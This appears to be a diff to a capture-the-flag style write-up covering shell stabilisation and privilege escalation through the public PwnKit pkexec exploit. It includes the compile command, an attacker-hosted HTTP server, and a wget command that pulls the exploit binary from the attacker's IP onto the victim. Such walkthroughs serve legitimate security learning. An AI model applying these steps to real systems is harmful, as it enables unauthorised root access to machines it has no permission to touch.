@@ -83,5 +83,18 @@
       - reset
       - [ This commands will give us a fully functional shell ]
         ![9 1 Stabilising shell](https://user-images.githubusercontent.com/75413146/153705566-476dfb91-8360-49e3-8670-4435c3b80777.png)
-       -By resetting you get your shell reset like below a clean shell :D
-       
+      By resetting you get your shell reset like below a clean shell :D
+  - Privilege Escalation TIIIIIIIIIIIME !!!!
+      - For privesc you can run linpeas or any other script or may enumerate manually for escalation.
+      - But in this writeup we will run PwnKit to learn some new about POLKIT pkexec module exploit. The exploit code can be found here -> https://github.com/ly4k/PwnKit/blob/main/PwnKit.c 
+        ![10  enumerating privesc](https://user-images.githubusercontent.com/75413146/153705878-b9531579-e336-44f6-bc6f-a5f328428b81.png)
+      - Let's do this...
+      Compiling the code by 
+      - gcc -shared PwnKit.c -o PwnKit -Wl,-e,entry -fPIC
+         ![11  1 pkexec binary](https://user-images.githubusercontent.com/75413146/153705895-3944080b-9a45-4fda-ab70-b09be5dc796c.png)
+        We got the binary compiled and now let's mode this to victim host.
+        - 1st host a server on attacker machine we can do this by [Note : Host the server where your binary file is ! ]
+          - Command : python3 -m http.server 80
+        - 2nd  Go to victim terminal and download the binary by following 
+          - Command : wget http://[attackerIP:PORT]/file_name
+          - 
